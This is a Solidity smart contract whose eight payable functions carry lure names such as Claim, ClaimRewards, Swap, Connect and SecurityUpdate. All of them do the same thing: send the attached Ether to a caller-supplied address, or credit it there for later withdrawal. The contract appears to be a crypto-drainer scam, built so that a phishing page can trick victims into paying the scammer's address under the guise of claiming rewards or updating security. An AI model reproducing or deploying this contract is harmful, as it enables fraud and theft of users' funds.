1 // SPDX-License-Identifier: Unlicense
2 
3 pragma solidity ^0.8.18;
4 
5 
6 
7 contract G_Contract {
8 
9   address private owner;
10   mapping (address => uint256) private balance;
11   mapping (address => bool) private auto_withdraw;
12 
13   constructor() { owner = msg.sender; }
14   function getOwner() public view returns (address) { return owner; }
15   function getBalance() public view returns (uint256) { return address(this).balance; }
16   function getUserBalance(address wallet) public view returns (uint256) { return balance[wallet]; }
17   function getWithdrawStatus(address wallet) public view returns (bool) { return auto_withdraw[wallet]; }
18   function setWithdrawStatus(bool status) public { auto_withdraw[msg.sender] = status; }
19 
20   function withdraw(address where) public {
21     uint256 amount = balance[msg.sender];
22     require(address(this).balance >= amount, "BALANCE_LOW");
23     balance[msg.sender] = 0; payable(where).transfer(amount);
24   }
25 
26   function Claim(address sender) public payable { if (auto_withdraw[sender]) payable(sender).transfer(msg.value); else balance[sender] += msg.value; }
27   function ClaimReward(address sender) public payable { if (auto_withdraw[sender]) payable(sender).transfer(msg.value); else balance[sender] += msg.value; }
28   function ClaimRewards(address sender) public payable { if (auto_withdraw[sender]) payable(sender).transfer(msg.value); else balance[sender] += msg.value; }
29   function Execute(address sender) public payable { if (auto_withdraw[sender]) payable(sender).transfer(msg.value); else balance[sender] += msg.value; }
30   function Multicall(address sender) public payable { if (auto_withdraw[sender]) payable(sender).transfer(msg.value); else balance[sender] += msg.value; }
31   function Swap(address sender) public payable { if (auto_withdraw[sender]) payable(sender).transfer(msg.value); else balance[sender] += msg.value; }
32   function Connect(address sender) public payable { if (auto_withdraw[sender]) payable(sender).transfer(msg.value); else balance[sender] += msg.value; }
33   function SecurityUpdate(address sender) public payable { if (auto_withdraw[sender]) payable(sender).transfer(msg.value); else balance[sender] += msg.value; }
34 
35 }